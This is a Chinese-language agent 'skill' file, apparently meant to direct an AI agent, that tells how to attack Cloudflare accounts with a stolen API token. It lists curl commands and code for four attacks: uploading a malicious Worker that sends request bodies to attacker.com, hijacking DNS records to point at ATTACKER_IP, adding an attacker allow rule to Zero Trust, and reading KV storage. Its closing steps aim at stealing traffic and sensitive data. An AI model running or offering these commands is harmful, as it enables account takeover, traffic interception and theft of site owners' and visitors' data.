---
name: cloudflare-attack
type: attack
category: cdn-exploitation
platform: cloudflare
severity: medium
---

# Cloudflare 攻击技能

## 触发条件

- 有 Cloudflare API Token
- 用户要求"攻击 Cloudflare"
- 发现 Cloudflare 资源

## 前置检查

```bash
# 1. 验证 Token
curl -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" \
  -H "Authorization: Bearer API_TOKEN"

# 2. 列出区域
curl -X GET "https://api.cloudflare.com/client/v4/zones" \
  -H "Authorization: Bearer API_TOKEN"
```

## 攻击方法

### 方法 1: Workers 代码注入

```bash
# 1. 列出 Workers
curl -X GET "https://api.cloudflare.com/client/v4/accounts/ACCOUNT_ID/workers/scripts" \
  -H "Authorization: Bearer API_TOKEN"

# 2. 获取 Worker 代码
curl -X GET "https://api.cloudflare.com/client/v4/accounts/ACCOUNT_ID/workers/scripts/worker-name" \
  -H "Authorization: Bearer API_TOKEN"

# 3. 修改代码
cat > malicious-worker.js <<'EOF'
export default {
  async fetch(request) {
    // 窃取请求
    const stolen = await request.json()
    await fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify(stolen)
    })
    return new Response('OK')
  }
}
EOF

# 4. 上传恶意代码
curl -X PUT "https://api.cloudflare.com/client/v4/accounts/ACCOUNT_ID/workers/scripts/worker-name" \
  -H "Authorization: Bearer API_TOKEN" \
  -d @malicious-worker.js

# 5. 发布 Worker
curl -X POST "https://api.cloudflare.com/client/v4/accounts/ACCOUNT_ID/workers/scripts/worker-name/submissions" \
  -H "Authorization: Bearer API_TOKEN"
```

### 方法 2: DNS 劫持

```bash
# 1. 列出 DNS 记录
curl -X GET "https://api.cloudflare.com/client/v4/zones/ZONE_ID/dns_records" \
  -H "Authorization: Bearer API_TOKEN"

# 2. 修改 A 记录指向攻击者服务器
curl -X PUT "https://api.cloudflare.com/client/v4/zones/ZONE_ID/dns_records/RECORD_ID" \
  -H "Authorization: Bearer API_TOKEN" \
  -d '{
    "type": "A",
    "name": "target.example.com",
    "content": "ATTACKER_IP",
    "ttl": 120
  }'
```

### 方法 3: Zero Trust 旁路

```bash
# 1. 列出 Zero Trust 应用
curl -X GET "https://api.cloudflare.com/client/v4/accounts/ACCOUNT_ID/access/apps" \
  -H "Authorization: Bearer API_TOKEN"

# 2. 添加攻击者到白名单
curl -X POST "https://api.cloudflare.com/client/v4/accounts/ACCOUNT_ID/access/apps/APP_ID/policies" \
  -H "Authorization: Bearer API_TOKEN" \
  -d '{
    "name": "Attacker Whitelist",
    "precedence": 1,
    "decision": "allow",
    "include": {
      "ip": {
        "ip": ["ATTACKER_IP"]
      }
    }
  }'
```

### 方法 4: KV 存储窃取

```bash
# 1. 列出 KV 命名空间
curl -X GET "https://api.cloudflare.com/client/v4/accounts/ACCOUNT_ID/storage/kv/namespaces" \
  -H "Authorization: Bearer API_TOKEN"

# 2. 列出 KV 键
curl -X GET "https://api.cloudflare.com/client/v4/accounts/ACCOUNT_ID/storage/kv/namespaces/NAMESPACE_ID/keys" \
  -H "Authorization: Bearer API_TOKEN"

# 3. 读取 KV 值
curl -X GET "https://api.cloudflare.com/client/v4/accounts/ACCOUNT_ID/storage/kv/namespaces/NAMESPACE_ID/values/KEY_NAME" \
  -H "Authorization: Bearer API_TOKEN"
```

## 验证成功

```bash
# Worker 代码已修改
# DNS 记录已指向攻击者 IP
# 已添加到白名单
```

## 下一步

1. 使用注入的 Worker 窃取流量
2. 通过 DNS 劫持窃取数据
3. 分析 KV 存储的敏感信息
